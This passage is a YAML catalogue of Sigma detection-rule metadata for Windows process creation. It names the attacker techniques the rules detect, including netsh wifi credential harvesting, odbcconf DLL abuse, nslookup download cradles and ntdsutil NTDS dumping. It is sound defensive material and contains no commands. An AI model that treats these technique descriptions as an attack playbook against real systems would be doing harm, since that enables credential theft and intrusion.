  - attack.lateral-movement
  - attack.defense-evasion
  - attack.command-and-control
  - attack.t1090
  time_window: ''
  references:
  - https://www.fireeye.com/blog/threat-research/2019/01/bypassing-network-restrictions-through-rdp-tunneling.html
  false_positives:
  - Legitimate administration activity
  notes: ''
- detection_id: 42b1a5b8-353f-4f10-b256-39de4467faff
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_netsh_wifi_credential_harvesting.yml
  name: Harvesting Of Wifi Credentials Via Netsh.EXE
  description: Detect the harvesting of wifi credentials using netsh.exe
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1040
  tags:
  - attack.discovery
  - attack.credential-access
  - attack.t1040
  time_window: ''
  references:
  - https://blog.malwarebytes.com/threat-analysis/2020/04/new-agenttesla-variant-steals-wifi-credentials/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 903076ff-f442-475a-b667-4f246bcc203b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_nltest_execution.yml
  name: Nltest.EXE Execution
  description: Detects nltest commands that can be used for information discovery
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1016
  - T1018
  - T1482
  tags:
  - attack.discovery
  - attack.t1016
  - attack.t1018
  - attack.t1482
  time_window: ''
  references:
  - https://jpcertcc.github.io/ToolAnalysisResultSheet/details/nltest.htm
  false_positives:
  - Legitimate administration activity
  notes: ''
- detection_id: 5cc90652-4cbd-4241-aa3b-4b462fa5a248
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_nltest_recon.yml
  name: Potential Recon Activity Via Nltest.EXE
  description: Detects nltest commands that can be used for information discovery
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1016
  - T1482
  tags:
  - attack.discovery
  - attack.t1016
  - attack.t1482
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731935(v=ws.11)
  - https://thedfirreport.com/2021/08/16/trickbot-leads-up-to-fake-1password-installation/
  - https://thedfirreport.com/2020/10/18/ryuk-in-5-hours/
  - https://book.hacktricks.xyz/windows/basic-cmd-for-pentesters
  - https://research.nccgroup.com/2022/08/19/back-in-black-unlocking-a-lockbit-3-0-ransomware-attack/
  - https://eqllib.readthedocs.io/en/latest/analytics/03e231a6-74bc-467a-acb1-e5676b0fb55e.html
  - https://redcanary.com/blog/how-one-hospital-thwarted-a-ryuk-ransomware-outbreak/
  - https://github.com/redcanaryco/atomic-red-team/blob/5360c9d9ffa3b25f6495f7a16e267b719eba2c37/atomics/T1482/T1482.md#atomic-test-2---windows---discover-domain-trusts-with-nltest
  false_positives:
  - Legitimate administration use but user and host must be investigated
  notes: ''
- detection_id: 6640f31c-01ad-49b5-beb5-83498a5cd8bd
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_node_abuse.yml
  name: Potential Arbitrary Code Execution Via Node.EXE
  description: Detects the execution node.exe which is shipped with multiple software
    such as VMware, Adobe...etc. In order to execute arbitrary code. For example to
    establish reverse shell as seen in Log4j attacks...etc
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1127
  tags:
  - attack.defense-evasion
  - attack.t1127
  time_window: ''
  references:
  - http://blog.talosintelligence.com/2022/09/lazarus-three-rats.html
  - https://www.sprocketsecurity.com/resources/crossing-the-log4j-horizon-a-vulnerability-with-no-return
  - https://www.rapid7.com/blog/post/2022/01/18/active-exploitation-of-vmware-horizon-servers/
  - https://nodejs.org/api/cli.html
  false_positives:
  - Unlikely
  notes: ''
- detection_id: df1f26d3-bea7-4700-9ea2-ad3e990cf90e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_node_adobe_creative_cloud_abuse.yml
  name: Node Process Executions
  description: Detects the execution of other scripts using the Node executable packaged
    with Adobe Creative Cloud
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.007
  - T1127
  tags:
  - attack.defense-evasion
  - attack.execution
  - attack.t1127
  - attack.t1059.007
  time_window: ''
  references:
  - https://twitter.com/mttaggart/status/1511804863293784064
  false_positives:
  - Unknown
  notes: ''
- detection_id: 3b4e950b-a3ea-44d3-877e-432071990709
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_notepad_local_passwd_discovery.yml
  name: Notepad Password Files Discovery
  description: Detects the execution of Notepad to open a file that has the string
    "password" which may indicate unauthorized access to credentials or suspicious
    activity.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: experimental
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1083
  tags:
  - attack.discovery
  - attack.t1083
  time_window: ''
  references:
  - https://thedfirreport.com/2025/02/24/confluence-exploit-leads-to-lockbit-ransomware/
  - https://intel.thedfirreport.com/eventReports/view/57
  false_positives:
  - Legitimate use of opening files from remote hosts by administrators or users.
    However, storing passwords in text readable format could potentially be a violation
    of the organization's policy. Any match should be investigated further.
  notes: ''
- detection_id: e6313acd-208c-44fc-a0ff-db85d572e90e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_nslookup_domain_discovery.yml
  name: Network Reconnaissance Activity
  description: Detects a set of suspicious network related commands often used in
    recon stages
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1082
  - T1087
  tags:
  - attack.discovery
  - attack.t1087
  - attack.t1082
  - car.2016-03-001
  time_window: ''
  references:
  - https://thedfirreport.com/2022/02/07/qbot-likes-to-move-it-move-it/
  false_positives:
  - False positives depend on scripts and administrative tools used in the monitored
    environment
  notes: ''
- detection_id: 1b3b01c7-84e9-4072-86e5-fc285a41ff23
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_nslookup_poweshell_download.yml
  name: Nslookup PowerShell Download Cradle - ProcessCreation
  description: Detects suspicious powershell download cradle using nslookup. This
    cradle uses nslookup to extract payloads from DNS records
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  time_window: ''
  references:
  - https://twitter.com/Alh4zr3d/status/1566489367232651264
  false_positives:
  - Unknown
  notes: ''
- detection_id: a58353df-af43-4753-bad0-cd83ef35eef5
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_ntdsutil_susp_usage.yml
  name: Suspicious Usage Of Active Directory Diagnostic Tool (ntdsutil.exe)
  description: Detects execution of ntdsutil.exe to perform different actions such
    as restoring snapshots...etc.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1003.003
  tags:
  - attack.credential-access
  - attack.t1003.003
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731620(v=ws.11)
  - https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/espionage-asia-governments
  false_positives:
  - Legitimate usage to restore snapshots
  - Legitimate admin activity
  notes: ''
- detection_id: 2afafd61-6aae-4df4-baed-139fa1f4c345
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_ntdsutil_usage.yml
  name: Invocation of Active Directory Diagnostic Tool (ntdsutil.exe)
  description: Detects execution of ntdsutil.exe, which can be used for various attacks
    against the NTDS database (NTDS.DIT)
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1003.003
  tags:
  - attack.credential-access
  - attack.t1003.003
  time_window: ''
  references:
  - https://jpcertcc.github.io/ToolAnalysisResultSheet/details/ntdsutil.htm
  false_positives:
  - NTDS maintenance
  notes: ''
- detection_id: 3f5491e2-8db8-496b-9e95-1029fce852d4
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_odbcconf_driver_install.yml
  name: Driver/DLL Installation Via Odbcconf.EXE
  description: Detects execution of "odbcconf" with "INSTALLDRIVER" which installs
    a new ODBC driver. Attackers abuse this to install and run malicious DLLs.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218.008
  tags:
  - attack.defense-evasion
  - attack.t1218.008
  time_window: ''
  references:
  - https://lolbas-project.github.io/lolbas/Binaries/Odbcconf/
  - https://web.archive.org/web/20191023232753/https://twitter.com/Hexacorn/status/1187143326673330176
  - https://www.hexacorn.com/blog/2020/08/23/odbcconf-lolbin-trifecta/
  false_positives:
  - Legitimate driver DLLs being registered via "odbcconf" will generate false positives.
    Investigate the path of the DLL and its contents to determine if the action is
    authorized.
  notes: ''
- detection_id: cb0fe7c5-f3a3-484d-aa25-d350a7912729
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_odbcconf_driver_install_susp.yml
  name: Suspicious Driver/DLL Installation Via Odbcconf.EXE
  description: Detects execution of "odbcconf" with the "INSTALLDRIVER" action where
    the driver doesn't contain a ".dll" extension. This is often used as a defense
    evasion method.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218.008
  tags:
  - attack.defense-evasion
  - attack.t1218.008
  time_window: ''
  references:
  - https://lolbas-project.github.io/lolbas/Binaries/Odbcconf/
  - https://web.archive.org/web/20191023232753/https://twitter.com/Hexacorn/status/1187143326673330176
  - https://www.hexacorn.com/blog/2020/08/23/odbcconf-lolbin-trifecta/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 6b65c28e-11f3-46cb-902a-68f2cafaf474
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_odbcconf_exec_susp_locations.yml
  name: Odbcconf.EXE Suspicious DLL Location
  description: Detects execution of "odbcconf" where the path of the DLL being registered
    is located in a potentially suspicious location.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218.008
  tags:
  - attack.defense-evasion
  - attack.t1218.008
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/sql/odbc/odbcconf-exe?view=sql-server-ver16
  - https://www.trendmicro.com/en_us/research/17/h/backdoor-carrying-emails-set-sights-on-russian-speaking-businesses.html
  - https://securityintelligence.com/posts/raspberry-robin-worm-dridex-malware/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 9f0a8bf3-a65b-440a-8c1e-5cb1547c8e70
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_odbcconf_register_dll_regsvr.yml
  name: New DLL Registered Via Odbcconf.EXE
  description: Detects execution of "odbcconf" with "REGSVR" in order to register
    a new DLL (equivalent to running regsvr32). Attackers abuse this to install and
    run malicious DLLs.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218.008
  tags:
  - attack.defense-evasion
  - attack.t1218.008
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/sql/odbc/odbcconf-exe?view=sql-server-ver16
  - https://lolbas-project.github.io/lolbas/Binaries/Odbcconf/
  - https://redcanary.com/blog/raspberry-robin/
  - https://web.archive.org/web/20191023232753/https://twitter.com/Hexacorn/status/1187143326673330176
  - https://www.hexacorn.com/blog/2020/08/23/odbcconf-lolbin-trifecta/
  - https://www.trendmicro.com/en_us/research/17/h/backdoor-carrying-emails-set-sights-on-russian-speaking-businesses.html
  false_positives:
  - Legitimate DLLs being registered via "odbcconf" will generate false positives.
    Investigate the path of the DLL and its content to determine if the action is
    authorized.
  notes: ''
- detection_id: ba4cfc11-d0fa-4d94-bf20-7c332c412e76
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_odbcconf_register_dll_regsvr_susp.yml
  name: Potentially Suspicious DLL Registered Via Odbcconf.EXE
  description: Detects execution of "odbcconf" with the "REGSVR" action where the
    DLL in question doesn't contain a ".dll" extension. Which is often used as a method
    to evade defenses.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218.008
  tags:
  - attack.defense-evasion
  - attack.t1218.008
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/sql/odbc/odbcconf-exe?view=sql-server-ver16
  - https://lolbas-project.github.io/lolbas/Binaries/Odbcconf/
  - https://www.trendmicro.com/en_us/research/17/h/backdoor-carrying-emails-set-sights-on-russian-speaking-businesses.html
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 5f03babb-12db-4eec-8c82-7b4cb5580868
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_odbcconf_response_file.yml
  name: Response File Execution Via Odbcconf.EXE
  description: Detects execution of "odbcconf" with the "-f" flag in order to load
    a response file which might contain a malicious action.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218.008
  tags:
  - attack.defense-evasion
  - attack.t1218.008
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/sql/odbc/odbcconf-exe?view=sql-server-ver16
  - https://lolbas-project.github.io/lolbas/Binaries/Odbcconf/
  - https://www.cybereason.com/blog/threat-analysis-report-bumblebee-loader-the-high-road-to-enterprise-domain-control
  - https://www.hexacorn.com/blog/2020/08/23/odbcconf-lolbin-trifecta/
  false_positives:
  - The rule is looking for any usage of response file, which might generate false
    positive when this function is used legitimately. Investigate the contents of
    the ".rsp" file to determine if it is malicious and apply additional filters if
    necessary.
  notes: ''
- detection_id: 2d32dd6f-3196-4093-b9eb-1ad8ab088ca5
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_odbcconf_response_file_susp.yml
  name: Suspicious Response File Execution Via Odbcconf.EXE
  description: Detects execution of "odbcconf" with the "-f" flag in order to load
    a response file with a non-".rsp" extension.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218.008
  tags:
  - attack.defense-evasion
  - attack.t1218.008
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/sql/odbc/odbcconf-exe?view=sql-server-ver16
  - https://lolbas-project.github.io/lolbas/Binaries/Odbcconf/
  - https://www.trendmicro.com/en_us/research/17/h/backdoor-carrying-emails-set-sights-on-russian-speaking-businesses.html
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 8e3c7994-131e-4ba5-b6ea-804d49113a26
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_odbcconf_uncommon_child_process.yml
  name: Uncommon Child Process Spawned By Odbcconf.EXE
  description: Detects an uncommon child process of "odbcconf.exe" binary which normally
    shouldn't have any child processes.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218.008
  tags:
  - attack.defense-evasion
  - attack.t1218.008
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/sql/odbc/odbcconf-exe?view=sql-server-ver16
  - https://lolbas-project.github.io/lolbas/Binaries/Odbcconf/
  - https://medium.com/@cyberjyot/t1218-008-dll-execution-using-odbcconf-exe-803fa9e08dac
  false_positives:
  - In rare occurrences where "odbcconf" crashes. It might spawn a "werfault" process
  - Other child processes will depend on the DLL being registered by actions like
    "regsvr". In case where the DLLs have external calls (which should be rare). Other
    child processes might spawn and additional filters need to be applied.
  notes: ''
- detection_id: 4ae3e30b-b03f-43aa-87e3-b622f4048eed
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_office_arbitrary_cli_download.yml
  name: Potential Arbitrary File Download Using Office Application
  description: Detects potential arbitrary file download using a Microsoft Office
    application
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1202
  tags:
  - attack.defense-evasion
  - attack.t1202
  time_window: ''
  references:
  - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Winword/
  - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Powerpnt/
  - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Excel/
  - https://medium.com/@reegun/unsanitized-file-validation-leads-to-malicious-payload-download-via-office-binaries-202d02db7191
  false_positives:
  - Unknown
  notes: ''
- detection_id: 551d9c1f-816c-445b-a7a6-7a3864720d60
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_office_excel_dcom_lateral_movement.yml
  name: Potential Excel.EXE DCOM Lateral Movement Via ActivateMicrosoftApp
  description: 'Detects suspicious child processes of Excel which could be an indicator
    of lateral movement leveraging the "ActivateMicrosoftApp" Excel DCOM object.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1021.003
  tags:
  - attack.t1021.003
  - attack.lateral-movement
  time_window: ''
  references:
  - https://posts.specterops.io/lateral-movement-abuse-the-power-of-dcom-excel-application-3c016d0d9922
  - https://github.com/grayhatkiller/SharpExShell
  - https://learn.microsoft.com/en-us/office/vba/api/excel.xlmsapplication
  false_positives:
  - Unknown
  notes: ''
- detection_id: f99abdf0-6283-4e71-bd2b-b5c048a94743
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_office_exec_from_trusted_locations.yml
  name: Potentially Suspicious Office Document Executed From Trusted Location
  description: Detects the execution of an Office application that points to a document
    that is located in a trusted location. Attackers often used this to avoid macro
    security and execute their malicious code.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1202
  tags:
  - attack.defense-evasion
  - attack.t1202
  time_window: ''
  references:
  - Internal Research
  - https://twitter.com/Max_Mal_/status/1633863678909874176
  - https://techcommunity.microsoft.com/t5/microsoft-365-blog/new-security-hardening-policies-for-trusted-documents/ba-p/3023465
  - https://twitter.com/_JohnHammond/status/1588155401752788994
  false_positives:
  - Unknown
  notes: ''
- detection_id: 84b1706c-932a-44c4-ae28-892b28a25b94
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_office_onenote_embedded_script_execution.yml
  name: OneNote.EXE Execution of Malicious Embedded Scripts
  description: 'Detects the execution of malicious OneNote documents that contain
    embedded scripts.

    When a user clicks on a OneNote attachment and then on the malicious link inside
    the ".one" file, it exports and executes the malicious embedded script from specific
    directories.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218.001
  tags:
  - attack.defense-evasion
  - attack.t1218.001
  time_window: ''
  references:
  - https://bazaar.abuse.ch/browse/tag/one/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: c27515df-97a9-4162-8a60-dc0eeb51b775
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_office_onenote_susp_child_processes.yml
  name: Suspicious Microsoft OneNote Child Process
  description: Detects suspicious child processes of the Microsoft OneNote application.
    This may indicate an attempt to execute malicious embedded objects from a .one
    file.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1566
  - T1566.001
  tags:
  - attack.t1566
  - attack.t1566.001
  - attack.initial-access
  time_window: ''
  references:
  - https://github.com/elastic/protections-artifacts/commit/746086721fd385d9f5c6647cada1788db4aea95f#diff-e34e43eb5666427602ddf488b2bf3b545bd9aae81af3e6f6c7949f9652abdf18
  - https://micahbabinski.medium.com/detecting-onenote-one-malware-delivery-407e9321ecf0
  false_positives:
  - File located in the AppData folder with trusted signature
  notes: ''
- detection_id: 55f0a3a1-846e-40eb-8273-677371b8d912
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_office_outlook_enable_unsafe_client_mail_rules.yml
  name: Outlook EnableUnsafeClientMailRules Setting Enabled
  description: Detects an attacker trying to enable the outlook security setting "EnableUnsafeClientMailRules"
    which allows outlook to run applications or execute macros
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059
  - T1202
  tags:
  - attack.execution
  - attack.defense-evasion
  - attack.t1059
  - attack.t1202
  time_window: ''
  references:
  - https://www.fireeye.com/blog/threat-research/2018/12/overruled-containing-a-potentially-destructive-adversary.html
  - https://speakerdeck.com/heirhabarov/hunting-for-persistence-via-microsoft-exchange-server-or-outlook?slide=44
  - https://support.microsoft.com/en-us/topic/how-to-control-the-rule-actions-to-start-an-application-or-run-a-macro-in-outlook-2016-and-outlook-2013-e4964b72-173c-959d-5d7b-ead562979048
  false_positives:
  - Unknown
  notes: ''
- detection_id: a018fdc3-46a3-44e5-9afb-2cd4af1d4b39
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_office_outlook_execution_from_temp.yml
  name: Suspicious Execution From Outlook Temporary Folder
  description: Detects a suspicious program execution in Outlook temp folder
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1566.001
  tags:
  - attack.initial-access
  - attack.t1566.001
  time_window: ''
  references:
  - Internal Research
  false_positives:
  - Unknown
  notes: ''
- detection_id: 208748f7-881d-47ac-a29c-07ea84bf691d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_office_outlook_susp_child_processes.yml
  name: Suspicious Outlook Child Process
  description: Detects a suspicious process spawning from an Outlook process.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1204.002
  tags:
  - attack.execution
  - attack.t1204.002
  time_window: ''
  references:
  - https://www.hybrid-analysis.com/sample/465aabe132ccb949e75b8ab9c5bda36d80cf2fd503d52b8bad54e295f28bbc21?environmentId=100
  - https://mgreen27.github.io/posts/2018/04/02/DownloadCradle.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: e212d415-0e93-435f-9e1a-f29005bb4723
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_office_outlook_susp_child_processes_remote.yml
  name: Suspicious Remote Child Process From Outlook
  description: Detects a suspicious child process spawning from Outlook where the
    image is located in a remote location (SMB/WebDav shares).
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059
  - T1202
  tags:
  - attack.execution
  - attack.defense-evasion
  - attack.t1059
  - attack.t1202
  time_window: ''
  references:
  - https://github.com/sensepost/ruler
  - https://www.fireeye.com/blog/threat-research/2018/12/overruled-containing-a-potentially-destructive-adversary.html
  - https://speakerdeck.com/heirhabarov/hunting-for-persistence-via-microsoft-exchange-server-or-outlook?slide=49
  false_positives:
  - Unknown
  notes: ''
- detection_id: aa3a6f94-890e-4e22-b634-ffdfd54792cc
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_office_spawn_exe_from_users_directory.yml
  name: Suspicious Binary In User Directory Spawned From Office Application
  description: Detects an executable in the users directory started from one of the
    Microsoft Office suite applications (Word, Excel, PowerPoint, Publisher, Visio)
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1204.002
  tags:
  - attack.execution
  - attack.t1204.002
  - attack.g0046
  - car.2013-05-002
  time_window: ''
  references:
  - https://blog.morphisec.com/fin7-not-finished-morphisec-spots-new-campaign
  - https://www.virustotal.com/gui/file/23160972c6ae07f740800fa28e421a81d7c0ca5d5cab95bc082b4a986fbac57
  false_positives:
  - Unknown
  notes: ''
- detection_id: 438025f9-5856-4663-83f7-52f878a70a50
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_office_susp_child_processes.yml
  name: Suspicious Microsoft Office Child Process
  description: Detects a suspicious process spawning from one of the Microsoft Office
    suite products (Word, Excel, PowerPoint, Publisher, Visio, etc.)
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1047
  - T1204.002
  - T1218.010
  tags:
  - attack.defense-evasion
  - attack.execution
  - attack.t1047
  - attack.t1204.002
  - attack.t1218.010
  time_window: ''
  references:
  - https://www.hybrid-analysis.com/sample/465aabe132ccb949e75b8ab9c5bda36d80cf2fd503d52b8bad54e295f28bbc21?environmentId=100
  - https://mgreen27.github.io/posts/2018/04/02/DownloadCradle.html
  - https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware/
  - https://doublepulsar.com/follina-a-microsoft-office-code-execution-vulnerability-1a47fce5629e
  - https://github.com/vadim-hunter/Detection-Ideas-Rules/blob/02bcbfc2bfb8b4da601bb30de0344ae453aa1afe/Threat%20Intelligence/The%20DFIR%20Report/20210329_Sodinokibi_(aka_REvil)_Ransomware.yaml
